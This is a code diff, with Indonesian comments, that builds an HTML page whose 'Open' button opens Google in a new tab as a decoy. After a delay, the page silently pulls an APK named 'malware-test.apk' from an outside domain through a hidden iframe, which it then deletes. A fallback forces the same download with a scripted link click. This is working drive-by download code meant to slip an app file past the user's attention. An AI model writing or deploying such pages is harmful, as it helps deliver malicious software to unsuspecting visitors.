@@ -1,25 +1,69 @@
-<button id="start">Open</button>
+<!doctype html>
+<html>
+<head><meta charset="utf-8" />
+<title>Delayed download + redirect</title>
+</head>
+<body>
+  <center><h2>Peace Be Upon You</h2></center>
+  <button id="start">Open</button>
 
-<script>
-document.getElementById('start').addEventListener('click', () => {
-  // 1) buka Google di tab baru — ini di-trigger oleh user gesture sehingga biasanya tidak diblok
-  const googleWin = window.open('https://google.com', '_blank', 'noopener,noreferrer');
+  <script>
+  (function(){
+    const btn = document.getElementById('start');
+    const DOWNLOAD_URL = 'https://rebelsec.id/malware-test.apk'; // ganti sesuai file-mu
+    const DELAY_MS = 3000; // jeda 3 detik sebelum mulai download
 
-  // 2) tunggu 3 detik lalu mulai download di background pada tab ini
-  setTimeout(() => {
-    const iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-    // pastikan URL ini adalah file .apk yang kamu sajikan dari server-mu
-    iframe.src = 'https://rebelsec.id/malware-test.apk';
-    document.body.appendChild(iframe);
+    btn.addEventListener('click', () => {
+      // 1) buka Google di tab baru (user gesture -> biasanya tidak diblokir)
+      const googleTab = window.open('https://google.com', '_blank', 'noopener,noreferrer');
 
-    // opsional: bersihkan iframe setelah beberapa detik
-    setTimeout(() => {
-      try { document.body.removeChild(iframe); } catch(e) {}
-    }, 10_000);
-  }, 3000);
+      if (!googleTab) {
+        // Popup diblokir — fallback: beri tahu user agar mengizinkan popup
+        // atau kita bisa memulai download langsung di tab ini sebagai fallback.
+        const doDirectDownload = confirm(
+          'Popup blocked. Izin popup diperlukan untuk membuka Google di tab baru.\n' +
+          'Pilih OK untuk melanjutkan dan memulai download sekarang (akan memulai di tab ini).'
+        );
+        if (doDirectDownload) {
+          // langsung mulai unduh di tab ini (user memilih)
+          startDownloadInThisTab(DOWNLOAD_URL);
+        }
+        return;
+      }
 
-  // opsional: jika kamu ingin memfokus tab google yang baru dibuka:
-  // try { googleWin.focus(); } catch(e) {}
-});
-</script>
+      // jika popup berhasil dibuka, fokus tab google (opsional)
+      try { googleTab.focus(); } catch(e) {}
+
+      // 2) setelah delay, mulai unduh di background pada tab ASLI (menggunakan iframe)
+      setTimeout(() => {
+        // Gunakan iframe tersembunyi — browser akan melakukan request langsung ke DOWNLOAD_URL
+        // sehingga prompt/notification akan menyebutkan URL asal (rebelsec.id).
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = DOWNLOAD_URL;
+        document.body.appendChild(iframe);
+
+        // bersihkan iframe nanti agar DOM tidak menumpuk
+        setTimeout(() => {
+          try { document.body.removeChild(iframe); } catch(e) {}
+        }, 15_000);
+      }, DELAY_MS);
+    });
+
+    // fallback function: bila popup diblokir dan user setuju, mulai download di tab ini
+    function startDownloadInThisTab(url) {
+      // cara 1: langsung navigasi ke url (akan mengganti halaman)
+      // window.location.href = url;
+
+      // cara 2: buat dan klik <a> sehingga download dimulai (jika server memberikan Content-Disposition)
+      const a = document.createElement('a');
+      a.href = url;
+      // a.download = 'wkwkwk.apk'; // atribut ini kadang diabaikan untuk cross-origin
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+    }
+  })();
+  </script>
+</body>
+</html>
